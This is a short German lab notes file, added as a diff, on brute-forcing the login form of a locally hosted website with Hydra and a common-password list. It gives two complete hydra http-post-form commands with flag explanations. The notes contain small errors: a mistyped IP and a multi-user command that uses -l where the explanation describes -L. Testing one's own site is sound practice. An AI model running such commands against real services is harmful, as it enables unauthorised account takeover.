@@ -1,0 +1,36 @@
+# Passwortliste: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt
+
+Zieladresse: -->IP von PC der Website hostet
+IP von PC: 192.168.0.108
+!! 127.0.0.1 geht nicht, wenn Hydra aus VM ausgeführt wird da 127.0.0.1 LoopBack-Adresse ist(d.h. auf sich selber zeigt) !!
+ 127.0.0.1 --> VM
+ 192.68,0.108 --> Website Host IP (Mein PC)
+
+
+Einzelner User:
+hydra -l $(cat singleUser.txt) -P 10k-most-common.txt 192.168.0.108 http-post-form \
+"/login:username=^USER^&password=^PASS^:F=no user with this credentials found. False Username or Password" \
+-s 5000 -V -f
+
+Mehrere User:
+hydra -l $(cat singleUser.txt) -P 10k-most-common.txt 192.168.0.108 http-post-form \
+"/login:username=^USER^&password=^PASS^:F=no user with this credentials found. False Username or Password." \
+-s 5000 -V
+
+
+Befehl erklärt:
+
+-L users.txt: Gibt die Datei an, die die Benutzernamen enthält.
+-P 10k-most-common.txt: Gibt die Passwortliste an (in deinem Fall bleiben die 10.000 häufigsten Passwörter).
+
+http-post-form: Gibt die Art der Authentifizierung (HTTP-POST-Formular) an.
+
+"/login:username=^USER^&password=^PASS^:F=no user with this credentials found. False Username or Password.": 
+Der URL-Endpunkt und das Suchmuster für die Fehlermeldung, um ungültige Anmeldungen zu erkennen.
+
+-s 5000: Gibt den Port an (in deinem Fall 5000).
+-V: Aktiviert den verbosen Modus, um jeden Versuch zu sehen.
+-f: Beendet den Angriff sofort, wenn eine gültige Kombination gefunden wird.
+
+funktioniert irwie nicht mehr --> nochmal nachtesten
+virtualbox guest additions funktionieren auch nicht --> nachtesten
